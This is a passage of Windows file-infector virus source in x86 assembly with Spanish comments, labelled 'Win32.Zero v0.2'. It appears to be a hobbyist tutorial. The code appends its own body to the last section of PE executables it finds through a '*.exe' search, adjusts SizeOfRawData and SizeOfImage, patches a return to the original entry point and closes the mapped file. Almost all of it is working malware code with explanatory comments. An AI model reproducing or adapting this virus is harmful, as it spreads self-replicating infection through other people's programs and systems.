                                                   ; y en seccion + 08h la VirtualSize (ya incrementada)  con el tamanio de nuestro virus
    
    mov     ebx, [esi + 10h]            ; SizeOfRawData antes de modificarla
    mov     [ebp + offset SizeOfRDAnt], ebx     ; la guardamos

    mov     eax, longVirus               ; tamaño del virus
    add      eax, ebx                       ; le sumo la SizeOfRawData actual y asi obtengo el 
                                                  ; valor a redondear 

    mov     ebx, [ebp + offset AlineamArchivo]   ; edx=alineam. de las secciones en disco
    xor      edx, edx                        ; ponemos edx en cero para realizar la división
    div      ebx                               ; dividimos eax/ebx y el cociente en eax por el alineamiento

    cmp    edx, 0                           ; en edx queda el resto de la división
    je       no_incrementaSecc                                 
    inc      eax                               ; si el resto es distinto de cero le suma uno que sera el tamanio que pongasmo en size of RawData.
 
no_incrementaSecc:
    mov     edx, [ebp + offset AlineamArchivo]   ; edx=alineam. de las secciones en disco
    mul      edx                             ; multiplico por el alineamiento y obtengo asi el      
                                                 ;tamaño alineado en eax  = eax * edx

    mov     [ebp + offset SizeOfRDNuevo], eax       ; guardo el nuevo valor de eax en sizeofRawData  
                                                 ;SizeOfRawData alineado
    
    mov     [esi + 10h], eax          ; cambio el valor del SizeOfRawData del host


;Ahora vamos a tener que corregir el valor de  de SizeOfImage, el cual contiene el tamaño total del archivo alineado y representa
;la memoria que necesita reservar Windows cuando el programa es cargado por el loader.


;El nuevo valor de SizeOfImage se puede obtener si al VirtualOffset de la última sección le sumamos el nuevo VirtualSize (original + tamaño del virus) y luego lo alineamos.

;El virtualOffset se encuentra en seccion + 0Ch y el VirtualSize está en seccion + 08h 


    mov     eax, [esi + 08h]                 ; eax = VirtualSize
    add      eax, [esi + 0Ch]                 ; eax = VirtualSize + VirtualOffset
        
    mov     ebx, [ebp + offset AlineamSeccion]      ; edx = alineamiento de las secciones 
                                                        ;en memoria
    xor      edx, edx                             ; ponemos edx en cero para realizar la división
    div       ebx                                    ; dividimos por el alineamiento

    cmp     edx, 0                                ; en edx queda el resto de la división
    je        no_incrementaSizeOfI                                 
    inc     eax                                     ; si el resto es distinto de cero le suma uno al 
                                                       ;valor obtenido       

no_incrementaSizeOfI:
    mov     edx, [ebp + offset AlineamSeccion]      ; edx = alineamiento de las secciones 
                                                      ;en memoria
    mul     edx                                   ; multiplico por el alineamiento y obtengo asi el 
                                                      ;tamaño alineado en eax  = eax * edx

    mov     esi, [ebp + offset inicioHostMem]       ; apuntamos al inicio del host mapeado 
                                                      ;en memoria
    mov     edi, [esi + 3Ch]                ; edi = dirección del PE header del host
    add      edi, esi                            ; le sumo la base ya que es una RVA

    mov     [edi + 50h], eax               ; guardo la nueva SizeOfImage obtenida     



;Bien ya tenemos todo listo, ahora vamos a copiar nuestro virus en el espacio creado al final del host original.

;Para ello vamos a hacer uso de estas 2 instrucciones: rep y movsb

;REP: esta instrucción va acompañada de otra y lo que hace es repetir dicho comando tantas veces como lo indique el registro ECX.
;MOVSB: esta instrucción se utiliza de la siguiente forma:
;MOVSB destino,origen y nos permite copiar un byte (por eso la B final, también podría ser W para word) desde un origen a un destino
;El origen se lo indicamos con los registros DS:SI (Source Index o índice fuente) y el destino con ES:DI (Destination Index o índice destino).´
;Además, luego de realizar el movimiento de datos, SI y DI son incrementados para que apunten a la próxima dirección de memoria.

;1.	ES:[DI] <- DS:[SI] (un byte)
;2.	DI <- DI+1
;3.	SI <- SI+1

;•	en esi = origen de la copia
;•	en edi = destino de la copia
;•	en ecx = tamaño del virus

	;Para identificarlo en el codigo

    lea       esi, [ebp + offset iniciovir]  ;direccion de nuestro virus    
    mov     edi, [ebp + offset UltimaSeccPE] ;justo donde empezamos a escribir.
    mov     ecx, longVirus     
    rep      movsb                                 




;############################################################


;ahora solo queda , sólo nos queda ver cómo le devolvemos la ejecución al host original luego de producida la infección y el ajuste de algunos valores que ayudarán al correcto funcionamiento del virus.


;#parte final
;############################################################################
;############################################################################
;Vamos a proteger los registro origianles del host guardando todos los registros origiansl y flags para luego volverlos a su estado original

;PUSHAD -->esta instrucción guarda el contenido de los registros en la pila (stack) en un orden determinado,
;esto equivale a hacer un push EAX, push ECX, push EDX, push EBX, push ESP, push EBP, push ESI, push EDI.

;PUSHFD: esta instrucción guarda el contenido del registro de Flags en la pila (stack).

;(los colocamos al iniciio de nuetros virus para guardar el eestado del archivo antes de ejecutar nuestro codigo).*****

;Cuando terminamos el codigo tendremos que hacer un POPAD(registros)y un POPFD (registros de la pila).

;========================================================================
; Una vez que terminamos todo, tenemos que preparar el código para
; devolverle el control al host original y se ejecute normalmente.
;========================================================================
    mov     ebx, [ebp + offset hostPE]             ; ebx = offset de la cabecera PE del host
    mov     ebx, [ebx + 034h]                      ; ebx = ImageBase del host
    mov     eax, [ebp + offset entryPoinOrig]      ; recuperamos el entry point original que habiamos guardado
    add     eax, ebx                               ; le sumamos la base ya que es una RVA

    mov     edi, [ebp + offset UltimaSeccPE]     
    
    lea     ecx, [offset volverHost + 12]

    sub     ecx, offset iniciovir					;Le cogemos el inicio del virus y se lo restamos para conocer directamente el desplazamiento 

    add     edi, ecx								;En edi tenemos el valor en memoria de la primera direccion de memoria de nuestra ultima seccion y susamos el desplazamiento para aniadir el OEP a la direccion de  donde es encuentra el db     68h,0,0,0,0
    mov     dword ptr [edi], eax                   ; Cargamos la direccion del entrypoint original en esa intruccion.








;Una vez que ya hayamos terminado con la rutina de infeccion tenemos que hacer lo siguiente:
;Desmapear el archivo que tenemos mapeado en memoria
desmapearArchivo:
    push      [ebp + offset inicioHostMem]    
    call        [ebp + offset zUViewOfFile]   
	

cierraMapeo:
    push    [ebp + offset handleMem]              ; handle devuelto por CreateFileMappingA    
	call        [ebp + offset zCloseHandle] ;Llamamos a closeHandle para cerrar el archivo que conseguimos abrir con CreateFileMappingA

cerrarArchivo:
    push      [ebp + offset handleCreate]               
    call        [ebp + offset zCloseHandle] ;Llamamos a closeHandle para cerrar el archivo que conseguimos abrir con CreateFileA
	
	
salirInfeccion:


	ret
infectar endp


;Este tipo de variables que necesitamos en nuestro codigo tienen que estar en esta seccion porque sino, cuando infectemos el archivo nuevo no vamos a poder infectarlo de nuevo.
datosvir:

MZkernel 	dd 0;Variable donde almacenamos la direccion de comienzo de la DLL kernel 32.
PEHeader	dd 0;Variable donde almacenamos la direccion del PE header.
contador	dd 0;Contador usado en la primera tabla para buscar en la segunda
EData		dd 0;Variable para la tabla de exportaciones.
AofNames	dd 0;Tabla adress of NAmes (Donde buscaremos por GetProcAdress)
GetPAddress	dd 0;Direccion donde vamos a guardar el GetPorcAddress 

GetPA       db "GetProcAddress";Definimos la cadena como db para poder compararla Byte a byte

;Variables para encontrar el GetModuleHandleA haciendo uso del getProcAddress

zGetModuleH db "GetModuleHandleA", 0
zUser32		db "user32.dll", 0
zMessageBox db "MessageBoxA", 0
mensaje2     db "Win32.Zero", 10, 10
            db "Mensaje de prueba usando GetProcAddres", 10, 10
            db "coded by krilin4 (2021)", 0
titulo2      db "[Win32.Zero v0.2]",0
;----------------------------------------


;Creamos una structura con el listado de nombres de APIs que vamos a utilizar y variables para almacerna la direccion de los metodos
    zAPIs           		db "FindFirstFileA", 0
                       		db "FindNextFileA", 0
                       		db "CreateFileA", 0
                       		db "CreateFileMappingA", 0
                       		db "MapViewOfFile", 0
                       		db "CloseHandle", 0
                       		db "UnmapViewOfFile", 0
                       		db 0 ;Para indicar que hemos terminado en el bucle

    zFindFirst      		dd 0
    zFindNext       		dd 0
    zCreateFile     		dd 0
    zCreateFileM    		dd 0
    zMapViewOfFile  		dd 0
    zCloseHandle    		dd 0
    zUViewOfFile    		dd 0



;

;Creamos las condiciones de los archivos que queremos infectar.

mascara         db "*.exe", 0 ;En este caso archivo ejecutables. (pero podriamos utilizar cualquier achivo que tenga cabecera PE.

;Creamos el lugar de memoria donde van a devolvernos informacion del archivo en cuestion:
    maxpath         equ 260

    filetime struct
        FT_dwLowDateTime    		dd ?
        FT_dwHighDateTime   		dd ?
    filetime ends

    w32finddata struct
        WFD_dwFileAttributes        	dd ?					;Usamos ? para definir variables sin valor
        WFD_ftCreationTime          	filetime <?>          ;usamos <?> para definir estructuras 
        WFD_ftLastAccessTime        	filetime <?>
        WFD_ftLastWriteTime         	filetime <?>
        WFD_nFileSizeHigh           	dd ?
        WFD_nFileSizeLow            	dd ?
        WFD_dwReserved0             	dd ?
        WFD_dwReserved1             	dd ?
        WFD_szFileName              	db maxpath dup  (?)
        WFD_szAlternateFileName     	db 13 dup  (?)
    w32finddata ends

    win32_find_data         		w32finddata <?> ;Definimos la variable win32_din_data que es una estructura. que a su vez contienes 3 elemetnso otra estructura filetime.
													;que es la que vamos a pasar a las APIs FindFirstFileA y FindNextFile.

    handleBusq      	dd 0 ;Handle que nos devuelve la funcion findFirstFile y que usaremos en FindNextFile.
   
    maxInfecciones  	equ 3 ;Constante -->Numero maximo de infecciones que vamos a realizar en archivos si estos son muy altos puede relentizar la ejecucion del programa. 
    
    archivosInfec		dd 0 ;Indice que contine el numero de archivos infectado.
    
    longVirus          	equ  finvir - iniciovir      	; tamaño del virus es una CONSTANTE que coge el tamanio de finvir y le resta iniciovir.
    
    longVirusHost    	dd   0                            ; tamaño del virus mas el host este valor lo calcularemos en el porgrama.
    
    handleCreate		dd   0 					;handle CreatefileA
    
    handleMem			dd   0 					;handle CreateFileMappingA

	inicioHostMem		dd   0 					;handle MapViewOfFile

;Variables para las comprobaciones

	hostPE				dd   0 					;Direccion donde se encuentra la cabezera PEHeader en memoria (RVA+ Base Address)
	
	
;Variable de file alignment y sectionAligment


AlineamArchivo			dd   0 					;fileAlignment


AlineamSeccion			dd	 0					;sectionAlignment


;Variable del entrypoint del archivo con el nuevo tamanio cargado en memoria:

entryPoinOrig			dd	0					;valor del entrypoint del nuevo archivo mapeado en memoria.



UltimaSeccPE			dd 	0					;Valor en memoria del final de la ultima seccion ejecutable(donde aniadimos nuetros virus)

SizeOfRDAnt				dd	0			;Tamanio antes del size of rawData antes de aniadirle nuestro virus.

SizeOfRDNuevo			dd	0			; tamanio del SiezOfRawData nuevo


finvir:
;Esta es la etiqueta que indica el final de nuestro malware :P


host:
    push	0
    push 	offset titulo
    push 	offset mensaje
    push 	0
    call 	MessageBox 

    push 	0
    call 	ExitProcess
    
end codigo
